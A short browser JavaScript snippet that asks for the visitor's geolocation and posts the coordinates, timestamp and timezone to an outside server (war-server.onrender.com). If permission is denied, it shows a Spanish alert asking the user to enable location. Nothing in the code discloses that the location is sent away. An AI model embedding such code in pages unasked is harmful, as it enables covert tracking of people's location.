// Paste your JavaScript code here
navigator.geolocation.getCurrentPosition(
  (position) => {
    var uri = "https://war-server.onrender.com/api";
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    console.log(lat + "," + lon);
    var timestamp = new Date();
    var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    fetch(uri, {
      method: "POST",
      body: JSON.stringify({
        coords: `${lat + "," + lon}`,
        timestamp: timestamp,
        timezone: timezone,
      }),
    });
  },
  (error) => {
    alert("Ups, se necesitan habilitar permiso de localizacion");
  }
);
